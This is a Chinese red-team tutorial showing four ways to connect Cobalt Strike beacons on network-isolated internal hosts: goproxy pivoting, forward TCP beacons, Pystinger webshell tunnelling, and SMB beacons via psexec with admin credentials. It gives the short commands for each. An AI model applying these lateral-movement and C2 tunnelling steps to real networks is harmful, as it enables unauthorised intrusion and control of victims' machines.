# 【红蓝对抗】内网不出网机器上线CobaltStrike

## 场景提出

已渗透至内网，获取到DMZ区出网机器CS权限发现内网不出网（此时又分为两种情况：1、内网和DMZ区互通；2、DMZ可通内网但内网不通DMZ），根据以上叙述可以简单搭建测试环境。

  

给出简单拓扑：

C2服务器：123.56.108.135

跳板机（双网卡）：192.168.163.129 ; 10.10.10.128

目标机器：10.10.10.129

![](../Images/07d654dde3a9cfdc23509f26142a5ed2.png)

## Goproxy上线CS

本种方式适用于**目标机器和DMZ互通**的情况下，具体思路如下：

跳板机开启http代理供目标机器使用，CobaltStrike新建一个监听器设置HTTP Proxy为跳板机代理地址，CobaltStrike生成**stagerless**木马上传到目标机器，如**不可直接上传可使用跳板机搭配certutil.exe或者命令执行写webshell等方式进行中转上传**，目标机器执行木马即可上线。

  

最终上线路径：

**10.10.10.129---->10.10.10.128:18080---->123.56.108.135**

![](../Images/1b75efd5ac419789da54acb048212036.png)

### 操作步骤

1.  上传goproxy到跳板机，开启http代理
    

```
proxy.exe http -t tcp -p "0.0.0.0:18080" --daemon
```

![](../Images/61dd9e5de5af0f2aa3aa6d61b925d9f7.png)

2.  CobaltStrike新建监听器，设置HTTP Proxy为http://10.10.10.128:18080
    

![](../Images/b3665684b3e1f592fa1146aa8557db8d.png)

3.  生成stageless的木马，监听器选择刚生成的goproxy
    

![](../Images/9bd505ff9bbf9ab18a3eb4454c454fa4.png)

4.  目标机器执行木马，可上线CS
    

![](../Images/0df203bd6c5be93b4f733115d51f67ca.png)

## 正向木马上线CS

此方法适用于DMZ能通内网但内网不通DMZ的状况即无法反弹会话的情况，遇到这种场景就要使用正向连接的木马来解决，在目标主机开启一个木马端口然后通过跳板机来连接。

  

### 操作步骤

1.  CobaltStrike创建一个beacon\_tcp监听器
    

![](../Images/bf9e8e16c90b05ace15c5dcb62b8626f.png)

2.  CS生成一个stageless木马，监听器选再Forword
    

![](../Images/b89ae4d3d3b471378d049c219b6b2ce8.png)

3.  运行生成的木马，并在10.10.10.128 beacon中执行connect x.x.x.x 18888即可建立子beacon上线CS。
    

```
connect 10.10.10.129 18888
```

![](../Images/c1b43f95eab6aa9febaac127c118cc25.png)

![](../Images/822db692f332786cc54d821f436cc90a.png)

## Pystinger上线CS

毒刺（Pystinger）通过webshell搭建内网socks4代理，可用于上线CobaltStrike，此方法适用于**目标主机不出网但存在web应用可被互联网访问的情况**。

### 操作步骤

1.  下载pytinger，选择适当的代理脚本上传到目标服务器，直接访问出现UTF-8即为成功。
    

```
项目地址：https://github.com/FunnyWolf/pystinger/blob/master/readme\_cn.md
```

![](../Images/11e78f5839124bbcc2ecde30779d007d.png)

2.  将stinger\_server.exe上传到目标服务器并开启服务端等待客户端连接。
    

```
start start stinger\_server.exe 0.0.0.0
```

![](../Images/8ee8cd9bf18592f8832f64670490413d.png)

3.  vps客户端连接服务端
    

```
./stinger\_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
```

![](../Images/0d7d5b2f65dab1955402c6a56a46de59.png)

4.  CobaltStrike新建监听器，HTTP Host设置为目标机器IP，端口默认为60020
    

![](../Images/c5089e7fe008c181bd6718f86d7c39af.png)

5.  生成一个stage木马，监听器选择新建的pystinger即可上线CS
    

![](../Images/a70d4bf31d27492257394b5fee26cfcb.png)

## SMB Beacon

使用CobaltStrike进行内网端口扫描时发现一台机器445端口开放且攻击者有此台机器Administrator密码但是这台机器不能正常出网的情况下可使用Beacon SMB获取到Beacon Shell。

### 操作步骤

1.  CobaltStrike新建SMB Listener
    

![](../Images/cdb2776d0e0c4d0493c5a189440cbbb3.png)

2.  建立IPC$空连接，并测试
    

```

beacon> shell net use \\\\10.10.10.136\\admin$ /user:"administrator" "xxxxxxx"
```

![](../Images/11b25add7d058ab5285e44036fb6faa5.png)

3.  使用Psexec获取SMB Beacon Shell
    

```
jump psexec 10.10.10.136 SMB
```

![](../Images/2ef962a1a5d8957c7837b95f50a6dd4d.png)

![](../Images/bb2f14fb412791e89bd5aca25f8e9fd8.png)
